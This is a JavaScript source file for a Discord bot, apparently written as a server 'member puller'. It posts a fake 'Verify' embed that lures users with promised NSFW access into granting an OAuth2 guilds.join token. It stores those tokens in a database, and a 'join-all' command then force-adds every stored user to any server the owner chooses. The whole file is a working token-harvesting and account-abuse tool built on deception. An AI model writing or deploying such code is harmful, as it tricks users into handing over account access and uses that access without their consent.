const axios = require('axios');
const { ButtonBuilder, EmbedBuilder } = require("@discordjs/builders");
const { Client, GatewayIntentBits, ActionRowBuilder } = require("discord.js");
const client = new Client({
  intents: [Object.values(GatewayIntentBits).reduce((a, b) => a | b)] || 32767,
  ws: { properties: { browser: "Discord Android" } },
});
const mongoose = require('mongoose');
const express = require('express');
const User = require('./models/User');

const app = express();
app.get('/', (req, res) => res.send('hello world'));

function addSlash() {
  const commands = ["button", "join-all", "check-users"];
  for (let command of commands) {
    client.guilds.cache.forEach((guild) => {
      guild.commands
        .create({
          name: command,
          description: command,
        })
        .catch(console.error);
    });
  }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

client.on("ready", async () => {
  await mongoose.connect(process.env.URI).then(db => console.log('DB Connected'));
  addSlash();
  console.log("Listo...");
  
});

const osint = '870684044441055264';

async function joinGuild(id, accessToken, server) {
    try {
        await axios({
            method: "PUT",
            url: `http://discordapp.com/api/guilds/${server}/members/${id}`,
            data: {
                access_token: `${accessToken}`
            },
            headers: {
              Authorization: `Bot ${process.env.TOKEN2}`,
              "Content-Type": "application/json",
            },
        });
    } catch(e) {
        if (e.response.data.message === 'Invalid OAuth2 access token') {
          const deleted = await User.findOneAndDelete({ accessToken });
          console.log('Se elimino', deleted.username, "de la base de datos!");
        }
        console.log(e.response.data.message);
    }
}

client.on("interactionCreate", async (interaction) => {
  if (!interaction.isCommand()) return;

  function error() {
     const embed = new EmbedBuilder()
      .setColor([255, 209, 220])
      .setDescription('No puedes ejecutar ese comando');
    return interaction.reply({embeds: [embed], ephemeral: true})
  }

  async function sendEmbed(text) {
    const embed = new EmbedBuilder()
      .setColor([255, 209, 220])
      .setDescription(text);
    return await interaction.reply({embeds: [embed]});
  }

  async function sendSecondEmbed(text) {
    const embed = new EmbedBuilder()
      .setColor([255, 209, 220])
      .setDescription(text);
    return await interaction.followUp({embeds: [embed]});
  }
  if (interaction.commandName === 'check-users') {
    if (interaction.member.user.id !== osint) return interaction.reply('No puedes usar este comando!');
    const users = await User.find({accessToken: { $ne: null }});
    return sendEmbed(`Existen \`${users.length}\` usuarios en la base de datos`);
  }
  
  if (interaction.commandName === 'join-all') {
    if (interaction.member.user.id !== osint) return error();
    await sendEmbed(`Se están empezando a unir usuarios a **${interaction.guild.name}**`);
    try {
        const users = await User.find({accessToken: { $ne: null }});
        console.log(users.length);
        for (let u of users) {
            joinGuild(u.userId, u.accessToken, interaction.guild.id);
            console.log(u.username);
            await sleep(1500);
        }
        //return sendSecondEmbed(`Proceso terminado!`)
    } catch(e) {
      console.log(e);
    }
  }
  
  if (interaction.commandName === "button") {
    const embed = new EmbedBuilder()
      .setColor([255, 209, 220])
      .setDescription("<a:hs_luna2:909835161795969045> __**Verify now**__\nClick the `verify` button to get access to **NSFW channels & more**!")
      .setImage('https://media.tenor.com/vLKtgeEU5JYAAAAd/sexy.gif');

    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel("✅Verify")
        .setStyle("Link")
        .setURL(
          "https://discord.com/oauth2/authorize?response_type=code&scope=identify%20guilds.join&client_id=1028707519129976842"
        )
    );
    await interaction.reply({
      embeds: [embed],
      components: [button],
    });
  }

  
});

client.on('guildMemberRemove', async (member) => {
    /*let user = await User.findOne({id: member.user.id});
    if (user) {
      joinGuild(user.userId, user.accessToken, guild.id);
    }*/

    console.log(member.user.username);
});
client.login(process.env.TOKEN2);